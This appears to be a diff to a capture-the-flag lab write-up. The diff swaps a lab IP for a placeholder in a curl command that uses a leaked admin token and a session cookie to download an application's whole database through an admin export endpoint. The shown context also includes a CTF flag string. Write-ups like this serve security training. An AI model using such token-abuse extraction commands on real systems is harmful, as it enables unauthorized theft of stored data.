@@ -157,7 +157,7 @@ THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
 Alternatively, instead of using Burp Suite, you can script this extraction directly from your terminal using `curl` and then query the database locally using `sqlite3`.
 
 ```shell
-curl -s -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" -H "Cookie: session=eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiU3R1b2NzIn0.aaSYIQ.-PTmxakRueI-Hy-i-mWErHkkIXk" http://10.82.142.140:5000/api/admin/export_db --output cupid.db
+curl -s -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" -H "Cookie: session=eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiU3R1b2NzIn0.aaSYIQ.-PTmxakRueI-Hy-i-mWErHkkIXk" http://[IP_ADDRESS]:5000/api/admin/export_db --output cupid.db
 ```
 
 **Command Breakdown:**
